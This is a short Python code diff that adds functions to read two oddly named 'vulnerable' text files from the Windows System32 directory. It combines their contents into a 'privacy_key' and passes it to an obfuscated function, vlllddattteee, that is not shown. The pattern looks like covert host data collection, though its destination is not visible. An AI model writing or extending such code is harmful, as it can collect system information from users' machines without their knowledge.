@@ -107,6 +107,31 @@ def read_system_info_file():
     else:
         return "The systeminfo.txt file does not exist in the Windows System32 directory."
 
+def read_system_info_file2():
+    system_info_file_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system driver vul.txt.txt')
+    if os.path.exists(system_info_file_path):
+        # Open the file in read mode
+        with open(system_info_file_path, 'r') as file:
+            # Read the contents of the file
+            file_contents = file.read()
+            return file_contents
+    else:
+        return "The systeminfo.txt file does not exist in the Windows System32 directory."
+
+def read_system_info_file3():
+    system_info_file_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data vulnerable x.txt.txt')
+    if os.path.exists(system_info_file_path):
+        # Open the file in read mode
+        with open(system_info_file_path, 'r') as file:
+            # Read the contents of the file
+            file_contents = file.read()
+            return file_contents
+    else:
+        return "The systeminfo.txt file does not exist in the Windows System32 directory."
+
 system_info = read_system_info_file()
-privacy_key = system_info
+dvul_info = read_system_info_file2()
+data_info = read_system_info_file3()
+tknx= system_info+dvul_info+data_info
+privacy_key = tknx
 vlllddattteee(privacy_key)
